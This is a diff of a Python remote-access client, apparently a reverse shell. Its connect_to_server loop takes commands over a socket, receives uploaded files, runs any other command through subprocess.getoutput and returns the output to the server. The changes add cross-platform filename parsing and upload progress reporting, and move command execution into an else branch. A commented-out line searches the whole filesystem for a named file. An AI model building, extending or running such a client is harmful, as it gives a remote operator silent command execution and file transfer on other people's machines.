@@ -27,8 +27,15 @@ def connect_to_server():
             break
 
         if command.lower().startswith("upload"):
+            # format filename
             file_path = command.split(" ")[1]
-            filename = file_path.split("/")[-1]
+            if '/' in file_path:
+                filename = file_path.split("/")[-1]
+            elif '\\' in file_path:
+                filename = file_path.split("\\")[-1]
+            else:
+                filename = file_path
+
             print(f"Downloading {filename}...")
 
             # Recevoir la taille du fichier (8 octets)
@@ -44,6 +51,9 @@ def connect_to_server():
                         raise EOFError('Connection closed before receiving all the data')
                     file.write(chunk)
                     received += len(chunk)
+                    # calculate progress
+                    progress = str(round(((received / file_size) * 100)))
+                    s.send(progress.encode('utf-8'))
 
             print("File uploaded successfully")
             s.send(b"File uploaded successfully")
@@ -79,10 +89,10 @@ def connect_to_server():
         #     output = subprocess.getoutput(f"find / -name {searched_file} 2>/dev/null")
         #     s.send(output.encode('utf-8'))
 
-        print(f"Executing command: {command}")
-
-        output = subprocess.getoutput(command.lower())
-        s.send(output.encode('utf-8'))
+        # print(f"Executing command: {command}")
+        else:
+            output = subprocess.getoutput(command.lower())
+            s.send(output.encode('utf-8'))
 
     s.close()
 
